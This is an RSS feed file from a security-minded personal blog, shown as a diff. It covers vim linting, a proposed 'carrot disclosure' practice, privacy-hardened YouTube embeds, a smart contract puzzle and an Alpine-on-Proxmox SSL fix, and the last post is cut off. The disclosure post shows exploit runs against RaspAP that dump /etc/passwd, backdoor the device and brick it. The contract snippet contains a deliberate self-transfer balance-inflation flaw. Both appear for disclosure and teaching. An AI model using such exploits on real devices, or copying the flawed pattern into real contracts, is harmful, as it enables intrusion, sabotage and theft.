@@ -1,0 +1,1472 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0"><channel><title>Artificial truth</title><link>https://dustri.org/b/</link><description></description><lastBuildDate>Sun, 10 Mar 2024 17:15:00 +0100</lastBuildDate><item><title>Using vale with vim</title><link>https://dustri.org/b/using-vale-with-vim.html</link><description>&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/LWN.net"&gt;LWN&lt;/a&gt; recently published an excellent
+(subscriber only) &lt;a href="https://lwn.net/Articles/964075/"&gt;article&lt;/a&gt; on
+&lt;a href="https://vale.sh/"&gt;vale&lt;/a&gt;, an &lt;em&gt;editorial style&lt;/em&gt; linter. One of the original goal
+of this little corner on the internet was to improve my English, a purpose it
+keeps serving. Adding some lightweight tooling to my text editor to push this
+goal even further sounds great.&lt;/p&gt;
+&lt;p&gt;Like all good software, vale &lt;a href="https://gitlab.alpinelinux.org/alpine/aports/-/tree/master/testing/vale"&gt;is
+packaged&lt;/a&gt;
+in Alpine, although it looked a tad neglected, so I sent &lt;a href="https://gitlab.alpinelinux.org/alpine/aports/-/merge_requests/61919"&gt;a
+pull-request&lt;/a&gt;
+to get it updated.
+Its configuration is pretty straightforward: a &lt;code&gt;~/.vale.ini&lt;/code&gt; file, with
+where to store/read its data and some preferences. It comes with a
+&lt;a href="https://vale.sh/hub/"&gt;couple of &lt;em&gt;packages&lt;/em&gt;&lt;/a&gt; for popular styles, like the ones
+from &lt;a href="https://vale.sh/hub/microsoft/"&gt;Microsoft&lt;/a&gt;,
+&lt;a href="https://vale.sh/hub/google/"&gt;Google&lt;/a&gt;, &lt;a href="https://vale.sh/hub/redhat/"&gt;RedHat&lt;/a&gt;, … then a simple &lt;code&gt;vale sync&lt;/code&gt; to force it to
+download and store the data, and you're good to go.&lt;/p&gt;
+&lt;p&gt;While &lt;code&gt;vale&lt;/code&gt; can be called from the command line, integration with my text
+editor is way more comfy. I'm sure there are a ton of plugins to integrate it
+with vim, but I'm not a huge fan of having my text editor run arbitrary code
+from the internet, so I threw the following 6 lines in &lt;a href="https://dustri.org/pub/vimrc"&gt;my vimrc&lt;/a&gt; instead:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;augroup&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;vale&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;filereadable&lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;expand&lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;~/.vale.ini&amp;quot;&lt;/span&gt;&lt;span class="ss"&gt;))&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nv"&gt;autocmd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;FileType&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;markdown&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;setlocal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;makeprg&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;vale&lt;/span&gt;\&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nv"&gt;output&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;line&lt;/span&gt;\&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;errorformat&lt;/span&gt;&lt;span class="o"&gt;=%&lt;/span&gt;&lt;span class="nv"&gt;f&lt;/span&gt;:&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nv"&gt;l&lt;/span&gt;:&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nv"&gt;c&lt;/span&gt;:&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nv"&gt;o&lt;/span&gt;:&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nv"&gt;m&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nv"&gt;nnoremap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nv"&gt;Leader&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nv"&gt;M&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;:&lt;span class="nv"&gt;make&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nv"&gt;CR&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nv"&gt;CR&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;end&lt;/span&gt;
+&lt;span class="nv"&gt;augroup&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;It checks if I have a &lt;code&gt;~/vale.ini&lt;/code&gt; file, and if so sets
+&lt;a href="https://vimhelp.org/options.txt.html#%27makeprg%27"&gt;&lt;code&gt;makeprg&lt;/code&gt;&lt;/a&gt; to vale, and
+configure &lt;a href="https://vimhelp.org/quickfix.txt.html#errorformat"&gt;&lt;code&gt;errorformat&lt;/code&gt;&lt;/a&gt; to
+properly parse vale's output. Now every time I type &lt;code&gt;&amp;lt;Leader&amp;gt; M&lt;/code&gt;, I get vale's
+diagnostics in my &lt;a href="https://vimhelp.org/quickfix.txt.html"&gt;quickfix window&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The next steps would likely be to &lt;s&gt;waste&lt;/s&gt; spend some time improving the theme
+of the aforementioned window, add some ad hoc rules to vale, and maybe try to
+show the diagnostics inline like the spellechecker is doing.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Sun, 10 Mar 2024 17:15:00 +0100</pubDate><guid isPermaLink="false">tag:dustri.org,2024-03-10:/b/using-vale-with-vim.html</guid><category>sysadmin</category></item><item><title>Carrot disclosure</title><link>https://dustri.org/b/carrot-disclosure.html</link><description>&lt;p&gt;Once you have found a vulnerability, you can either sit on it, or disclose it.
+There are usually two ways to disclose, with minor variations:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Coordinated_vulnerability_disclosure"&gt;Coordinated Disclosure&lt;/a&gt;,
+   where one gives time to the vendor to issue a fix before disclosing&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Full_disclosure_(computer_security)"&gt;Full Disclosure&lt;/a&gt;,
+   where one discloses immediately without notifying anyone before.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;I would like to coin a 3&lt;sup&gt;rd&lt;/sup&gt; one: &lt;em&gt;Carrot Disclosure&lt;/em&gt;, dangling a
+&lt;a href="https://en.wikipedia.org/wiki/Carrot_and_stick"&gt;metaphorical carrot&lt;/a&gt; in front
+of the vendor to incentivise change. The main idea is to only publish the
+(redacted) output of the exploit for a critical vulnerability, to showcase that the
+software is exploitable. Now the vendor has two choices: either perform a
+holistic audit of its software, fixing as many issues as possible in the hope
+of fixing the showcased vulnerability; or losing users who might not be happy
+running a known-vulnerable software. Users of this disclosure model are of
+course called Bugs Bunnies.&lt;/p&gt;
+&lt;p&gt;We all looked at catastrophic web applications, finding a ton
+of bugs, and deciding not to bother with reporting them, because they were too
+many of them, because we knew that there will be more of them lurking, because
+the vendor is a complete tool and it would take more time trying to properly
+disclose things than it took finding the vulnerabilities, … This is an
+excellent use case for Carrot Disclosure! Of course, for unauditably-large
+codebases, it doesn't work: you've got a Linux LPE, who cares.&lt;/p&gt;
+&lt;p&gt;Interestingly, it shifts the work balance a bit: it's usually harder to write
+an exploit than it's to fix here. But here, the vendor has to audit and fix
+its entire codebase, for the ~low cost of one (1) exploit, that you don't even
+have to publish if you don't want to.&lt;/p&gt;
+&lt;p&gt;If you want to be extra-nice, you can:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Publish the SHA256 of the exploit, to prove
+  that you weren't making things up, once it's fixed or if you get sued for
+  whatever frivolous reasons like libel.&lt;/li&gt;
+&lt;li&gt;Maintain the exploits against new versions, proving that the exploit is still
+  working.&lt;/li&gt;
+&lt;li&gt;Publish the exploit once it has been fixed, otherwise you risk to have
+  vendors call your bluff next time, or at least notify that the issue has been
+  fixed. Since you don't have hardcoded offsets because we're in 2024, you can even
+  put this in a continuous integration.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let's have an example, as a treat. A couple of shitty vulnerabilities for
+&lt;a href="https://raspap.com/"&gt;RaspAP&lt;/a&gt; that took me 5 minutes to find and at least 5
+more to write an exploit for each of them:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;$ &lt;/span&gt;./read-raspap.py&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.3.141.1&lt;span class="w"&gt; &lt;/span&gt;/etc/passwd&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;head&lt;span class="w"&gt; &lt;/span&gt;-n&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;
+&lt;span class="go"&gt;[+] Target is running RaspAP&lt;/span&gt;
+&lt;span class="go"&gt;[+] Dumping /etc/passwd&lt;/span&gt;
+&lt;span class="go"&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;
+&lt;span class="go"&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="go"&gt;bin:x:2:2:bin:/bin:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="gp"&gt;$ &lt;/span&gt;./authed-mitm-raspap.py&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.3.141.1
+&lt;span class="go"&gt;[+] default login/password in use&lt;/span&gt;
+&lt;span class="go"&gt;[+] backdooring system…&lt;/span&gt;
+&lt;span class="go"&gt;[+] system backdoored, enjoy your permanent MITM!&lt;/span&gt;
+&lt;span class="gp"&gt;$ &lt;/span&gt;./brick-raspap.py&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.3.141.1
+&lt;span class="go"&gt;[+] Target is running RaspAP&lt;/span&gt;
+&lt;span class="go"&gt;[+] Bricking the system…&lt;/span&gt;
+&lt;span class="go"&gt;[+] System bricked!&lt;/span&gt;
+&lt;span class="gp"&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;It looks like there is a low-hanging unauthenticated arbitrary code execution
+chainable with a privilege escalation to root as well, but since writing an
+exploit would take more than 5 minutes, I can't be bothered, and odds are that
+it'll be fixed along with the persistent denial-of-service anyway. Let me know
+when you think those are fixed.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Fri, 08 Mar 2024 21:30:00 +0100</pubDate><guid isPermaLink="false">tag:dustri.org,2024-03-08:/b/carrot-disclosure.html</guid><category>security</category></item><item><title>Youtube video embedding harm reduction</title><link>https://dustri.org/b/youtube-video-embedding-harm-reduction.html</link><description>&lt;p&gt;Embedding external content on a website in the current enshittocene period is
+more annoying than ever, so here is a copy-pasteable snippet to embed a youtube
+video while reducing its tracking and nuisance capabilities as much as possible:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;iframe&lt;/span&gt;
+    &lt;span class="na"&gt;credentialless&lt;/span&gt;
+    &lt;span class="na"&gt;allowfullscreen&lt;/span&gt;
+    &lt;span class="na"&gt;referrerpolicy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;no-referrer&amp;quot;&lt;/span&gt;
+    &lt;span class="na"&gt;sandbox&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;allow-scripts allow-same-origin&amp;quot;&lt;/span&gt;
+    &lt;span class="na"&gt;allow&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;accelerometer &amp;#39;none&amp;#39;; ambient-light-sensor &amp;#39;none&amp;#39;; autoplay &amp;#39;none&amp;#39;; battery &amp;#39;none&amp;#39;; bluetooth &amp;#39;none&amp;#39;; browsing-topics &amp;#39;none&amp;#39;; camera &amp;#39;none&amp;#39;; ch-ua &amp;#39;none&amp;#39;; display-capture &amp;#39;none&amp;#39;; domain-agent &amp;#39;none&amp;#39;; document-domain &amp;#39;none&amp;#39;; encrypted-media &amp;#39;none&amp;#39;; execution-while-not-rendered &amp;#39;none&amp;#39;; execution-while-out-of-viewport &amp;#39;none&amp;#39;; gamepad &amp;#39;none&amp;#39;; geolocation &amp;#39;none&amp;#39;; gyroscope &amp;#39;none&amp;#39;; hid &amp;#39;none&amp;#39;; identity-credentials-get &amp;#39;none&amp;#39;; idle-detection &amp;#39;none&amp;#39;; keyboard-map &amp;#39;none&amp;#39;; local-fonts &amp;#39;none&amp;#39;; magnetometer &amp;#39;none&amp;#39;; microphone &amp;#39;none&amp;#39;; midi &amp;#39;none&amp;#39;; navigation-override &amp;#39;none&amp;#39;; otp-credentials &amp;#39;none&amp;#39;; payment &amp;#39;none&amp;#39;; picture-in-picture &amp;#39;none&amp;#39;; publickey-credentials-create &amp;#39;none&amp;#39;; publickey-credentials-get &amp;#39;none&amp;#39;; screen-wake-lock &amp;#39;none&amp;#39;; serial &amp;#39;none&amp;#39;; speaker-selection &amp;#39;none&amp;#39;; sync-xhr &amp;#39;none&amp;#39;; usb &amp;#39;none&amp;#39;; web-share &amp;#39;none&amp;#39;; window-management &amp;#39;none&amp;#39;; xr-spatial-tracking &amp;#39;none&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+    &lt;span class="na"&gt;csp&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;sandbox allow-scripts allow-same-origin;&amp;quot;&lt;/span&gt;
+    &lt;span class="na"&gt;width&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;560&amp;quot;&lt;/span&gt;
+    &lt;span class="na"&gt;height&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;315&amp;quot;&lt;/span&gt;
+    &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://www.youtube-nocookie.com/embed/jfKfPfyJRdk&amp;quot;&lt;/span&gt;
+    &lt;span class="na"&gt;title&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;lofi hip hop radio 📚 - beats to relax/study to&amp;quot;&lt;/span&gt;
+    &lt;span class="na"&gt;frameborder&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;
+    &lt;span class="na"&gt;loading&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;lazy&amp;quot;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;iframe&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/Security/IFrame_credentialless"&gt;&lt;code&gt;credentialless&lt;/code&gt;&lt;/a&gt; to load youtube in a blank disposable context,
+  without access to the origin's network, cookies, and storage data.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;allowfullscreen&lt;/code&gt; because some people like it&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;referrerpolicy&lt;/code&gt; set to not leak your &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer"&gt;referer&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;sandbox&lt;/code&gt; to only allow javascript execution and SOP. Downloads, forms,
+  modals, screen orientation, pointer lock, popups, presentation session,
+  &lt;a href="https://developer.mozilla.org/en-US/docs/Web/API/Storage_Access_API"&gt;storage access&lt;/a&gt; and thus third-party cookies, 
+  top-navigation, … are all denied.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;allow&lt;/code&gt; with &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy#directives"&gt;every single directives&lt;/a&gt;
+  set to "absolutely-fucking-not", and yes, they have to be all set one by one,
+  and check regularly is new directive were added,
+  because there is &lt;a href="https://github.com/w3c/webappsec-permissions-policy/issues/208"&gt;no deny-all&lt;/a&gt;
+  in the &lt;a href="https://w3c.github.io/webappsec-permissions-policy/"&gt;spec&lt;/a&gt;. It seems
+  that every browser has its own list of directives, chrome is using &lt;a href="https://github.com/w3c/webappsec-permissions-policy/blob/main/features.md"&gt;this one&lt;/a&gt;
+  while firefox' prefers the &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy#directives"&gt;MDN one&lt;/a&gt;,
+  and of course the two differ. No doubt this was designed with privacy, simplicity, maintainability and security in mind.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;src&lt;/code&gt; set to &lt;code&gt;www.youtube-nocookie.com&lt;/code&gt; instead of &lt;code&gt;youtube.com&lt;/code&gt;. Both
+   are official Google urls, but the former doesn't do tracking via cookies,
+   and disables API and interaction and interaction logging. Amusingly, it's
+   the player used on &lt;code&gt;whitehouse.gov&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;csp&lt;/code&gt; set to &lt;code&gt;sandbox allow-scripts allow-same-origin;&lt;/code&gt; for compatibility's
+  sake, just in case.
+  I'd love to use a more restrictive policy, but the spec doesn't allow to
+  provide one, except if the embedded website explicitly allows it, and of
+  course youtube doesn't.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;loading="lazy"&lt;/code&gt; in case people don't scroll far enough to see the video, no
+  need to make them do queries to Google for no reasons.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Don't forget to put a &lt;code&gt;title&lt;/code&gt; for &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#accessibility_concerns"&gt;accessibility's sake&lt;/a&gt;.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Tue, 27 Feb 2024 14:45:00 +0100</pubDate><guid isPermaLink="false">tag:dustri.org,2024-02-27:/b/youtube-video-embedding-harm-reduction.html</guid><category>web</category></item><item><title>A silly "smart" contract bug</title><link>https://dustri.org/b/a-silly-smart-contract-bug.html</link><description>&lt;p&gt;I was idling on a &lt;a href="https://github.com/stypr"&gt;friend&lt;/a&gt;'s Discord server,
+when he posted a small snippet of code, taken from a &lt;a href="https://app.sentio.xyz/tx/1/0x4b9de8c56c8919e8598181449a3cc02df40435eb641eaec08ecce12d2342237f/contracts"&gt;smart contract&lt;/a&gt;
+apparently swapping &lt;a href="https://academy.binance.com/en/articles/what-is-wrapped-ether-weth-and-how-to-wrap-it"&gt;WETH&lt;/a&gt; to &lt;a href="https://miner.build/"&gt;MINER&lt;/a&gt;, but who cares, what's 
+interesting here is the bug, can you spot it?&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kt"&gt;function&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;_update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;address&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;from&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;address&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;to&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;uint256&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;bool&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;mint&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;internal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;virtual&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="kt"&gt;uint256&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;fromBalance&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_balances&lt;span class="p"&gt;[&lt;/span&gt;from&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="kt"&gt;uint256&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;toBalance&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_balances&lt;span class="p"&gt;[&lt;/span&gt;to&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="kt"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;fromBalance&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;value&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="w"&gt;            &lt;/span&gt;revert&lt;span class="w"&gt; &lt;/span&gt;ERC20InsufficientBalance&lt;span class="p"&gt;(&lt;/span&gt;from&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;fromBalance&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;value&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="w"&gt;        &lt;/span&gt;unchecked&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="c1"&gt;// Overflow not possible: value &amp;lt;= fromBalance &amp;lt;= totalSupply.&lt;/span&gt;
+&lt;span class="w"&gt;            &lt;/span&gt;_balances&lt;span class="p"&gt;[&lt;/span&gt;from&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;fromBalance&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;value&lt;span class="p"&gt;;&lt;/span&gt;
+
+&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="c1"&gt;// Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.&lt;/span&gt;
+&lt;span class="w"&gt;            &lt;/span&gt;_balances&lt;span class="p"&gt;[&lt;/span&gt;to&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;toBalance&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;value&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;As a hint, look at &lt;a href="https://app.sentio.xyz/tx/1/0x4b9de8c56c8919e8598181449a3cc02df40435eb641eaec08ecce12d2342237f"&gt;this transaction&lt;/a&gt;.
+Isn't it a cute bugdoor?&lt;/p&gt;
+&lt;p&gt;The snippet is taken from &lt;a href="https://twitter.com/shoucccc/status/1757777764646859121"&gt;this tweet&lt;/a&gt;,
+giving the issue away. Thanks to &lt;a href="https://github.com/kjsman"&gt;Jinseo Kim&lt;/a&gt; for holding my hand
+understanding what was going on there.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Fri, 16 Feb 2024 13:30:00 +0100</pubDate><guid isPermaLink="false">tag:dustri.org,2024-02-16:/b/a-silly-smart-contract-bug.html</guid><category>security</category></item><item><title>Fixing the /usr/lib/ssl/certs debacle with Alpine Linux on Proxmox</title><link>https://dustri.org/b/fixing-the-usrlibsslcerts-debacle-with-alpine-linux-on-proxmox.html</link><description>&lt;p&gt;There are currently some issues with regard to OpenSSL and Alpine Linux on
+Proxmox, tracked as &lt;a href="https://bugzilla.proxmox.com/show_bug.cgi?id=5194"&gt;#5194&lt;/a&gt; by Promox since the 19&lt;sup&gt;th&lt;/sup&gt; of January, with some patches sent by
+email (sigh) to fix the issue still waiting to land. The root cause being
+Proxmox setting &lt;code&gt;SSL_CERT_FILE='/usr/lib/ssl/cert.pem'&lt;/code&gt; when &lt;code&gt;pct enter&lt;/code&gt; is
+used, while on Alpine the &lt;code&gt;cert.pem&lt;/code&gt; file is in &lt;code&gt;/etc/ssl/cert.pem&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;In the meantime, here is what the problem looks like (for
+&lt;a href="https://en.wikipedia.org/wiki/Search_engine_optimization"&gt;SEO&lt;/a&gt;) and how to
+hack around it: &lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="go"&gt;root@pve ~ pct enter 122&lt;/span&gt;
+&lt;span class="gp"&gt;# &lt;/span&gt;apk&lt;span class="w"&gt; &lt;/span&gt;update
+&lt;span class="go"&gt;fetch https://dl-cdn.alpinelinux.org/alpine/v3.18/main/x86_64/APKINDEX.tar.gz&lt;/span&gt;
+&lt;span class="go"&gt;48AB2E51FA7F0000:error:80000002:system library:file_open:No such file or directory:providers/implementations/storemgmt/file_store.c:267:calling stat(/usr/lib/ssl/certs)&lt;/span&gt;
+&lt;span class="go"&gt;48AB2E51FA7F0000:error:80000002:system library:file_open:No such file or directory:providers/implementations/storemgmt/file_store.c:267:calling stat(/usr/lib/ssl/certs)&lt;/span&gt;
+&lt;span class="go"&gt;48AB2E51FA7F0000:error:80000002:system library:file_open:No such file or directory:providers/implementations/storemgmt/file_store.c:267:calling stat(/usr/lib/ssl/certs)&lt;/span&gt;
+&lt;span class="go"&gt;48AB2E51FA7F0000:error:80000002:system library:file_open:No such file or directory:providers/implementations/storemgmt/file_store.c:267:calling stat(/usr/lib/ssl/certs)&lt;/span&gt;
+&lt;span class="go"&gt;48AB2E51FA7F0000:error:0A000086:SSL routines:tls_post_process_server_certificate:certificate verify failed:ssl/statem/statem_clnt.c:1889:&lt;/span&gt;
+&lt;span class="go"&gt;WARNING: updating and opening https://dl-cdn.alpinelinux.org/alpine/v3.18/main: Permission denied&lt;/span&gt;
+&lt;span class="go"&gt;fetch https://dl-cdn.alpinelinux.org/alpine/v3.18/community/x86_64/APKINDEX.tar.gz&lt;/span&gt;
+&lt;span class="go"&gt;48AB2E51FA7F0000:error:80000002:system library:file_open:No such file or directory:providers/implementations/storemgmt/file_store.c:267:calling stat(/usr/lib/ssl/certs)&lt;/span&gt;
+&lt;span class="go"&gt;48AB2E51FA7F0000:error:80000002:system library:file_open:No such file or directory:providers/implementations/storemgmt/file_store.c:267:calling stat(/usr/lib/ssl/certs)&lt;/span&gt;
+&lt;span class="go"&gt;48AB2E51FA7F0000:error:80000002:system library:file_open:No such file or directory:providers/implementations/storemgmt/file_store.c:267:calling stat(/usr/lib/ssl/certs)&lt;/span&gt;
